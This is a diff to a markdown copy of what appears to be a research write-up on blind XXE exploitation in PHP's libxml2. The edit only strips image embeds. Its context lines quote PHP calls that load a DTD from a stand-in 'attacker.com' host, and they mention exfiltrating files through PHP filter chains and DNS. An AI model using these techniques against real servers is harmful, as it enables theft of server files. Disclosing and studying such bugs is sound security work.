@@ -104,7 +104,7 @@ Without the additional [`LIBXML_NOENT`](https://www.php.net/manual/en/libxml.con
 
 The following payload addresses all these issues:
 
-![](https://swarm.ptsecurity.com/wp-content/uploads/2025/03/c5a75364-img_1.png)
+!
 
 The [PoC script](https://github.com/bytehope/wwe) is available on GitHub.
 
@@ -255,7 +255,7 @@ will turn into
 
 Due to the absence of the `%xxe;` call, the DTD file will not be loaded.
 
-![](https://swarm.ptsecurity.com/wp-content/uploads/2025/03/0709363d-img_2.png)
+!
 
 To resolve the issue, let’s examine the libxml2 code once again:
 
@@ -338,7 +338,7 @@ First, let’s find out why the conventional blind XXE payload doesn’t work in
 
 When such a payload is loaded via `loadXML` with the `LIBXML_DTDLOAD` flag, no outbound request is sent to the attacker’s server, and PHP generates several notices:
 
-![](https://swarm.ptsecurity.com/wp-content/uploads/2025/03/cbfc1716-img_3.png)
+!
 
 To understand the problem, let’s begin our analysis with the entity parser:
 
@@ -462,7 +462,7 @@ $doc->loadXML('<!DOCTYPE x SYSTEM "http://attacker.com/malicious.dtd">
 
 We get an inbound HTTP request, with the content of `x` equal to `somedata`.
 
-![](https://swarm.ptsecurity.com/wp-content/uploads/2025/03/9ae95c69-img_4.png)
+!
 
 Hmm, now we need to figure out how to use this without calling the `xmlExpandPEsInEntityValue` function.
 
@@ -552,7 +552,7 @@ $doc->loadXML('<!DOCTYPE x SYSTEM " http://attacker.com/malicious.dtd"><x></x>',
 
 ```
 
-![](https://swarm.ptsecurity.com/wp-content/uploads/2025/03/91d382ad-img_5.png)
+!
 
 #### BRO PHP filters chain
 
@@ -576,7 +576,7 @@ Our DTD now looks like this:
 
 And it works!
 
-![](https://swarm.ptsecurity.com/wp-content/uploads/2025/03/a8474d2c-img_6.png)
+!
 
 But there is a catch: due to the nature of wrapwrap, the larger the file, the bigger the payload size. It can reach tens of kilobytes!
 
@@ -606,7 +606,7 @@ Let’s take a look at [lightyear](https://www.ambionics.io/blog/lightyear-file-
 
 Using lightyear dechunk from this research, we can break the resulting file into chunks. Unlike wrapwrap, lightyear dechunk has a minimal payload size. The combination of these two techniques significantly reduces the payload size. Even without the [`XML_PARSE_HUGE`](https://www.php.net/manual/en/libxml.constants.php#constant.libxml-parsehuge) flag set, it’s possible to exfiltrate files that are a few kilobytes in size!
 
-![](https://swarm.ptsecurity.com/wp-content/uploads/2025/03/6c59e220-Comapare2.png)
+!
 
 Here is an approximate algorithm for combining wrapwrap and lightyear:
 
@@ -659,7 +659,7 @@ Note the following points:
 - The length of each label (names separated by the symbol `.`) must not exceed 63 characters.
 - When encountering base64, Google DNS may randomly change uppercase characters to lowercase and vice versa. In this case, it will be necessary to additionally validate the resulting base64.
 
-![](https://swarm.ptsecurity.com/wp-content/uploads/2025/03/54482d7b-img_7.png)
+!
 
 ### Result
 
@@ -696,7 +696,7 @@ Contents of the external DTD:
 
 ```
 
-![](https://swarm.ptsecurity.com/wp-content/uploads/2025/03/965f95bc-img_8.png)
+!
 
 ### CVE
 
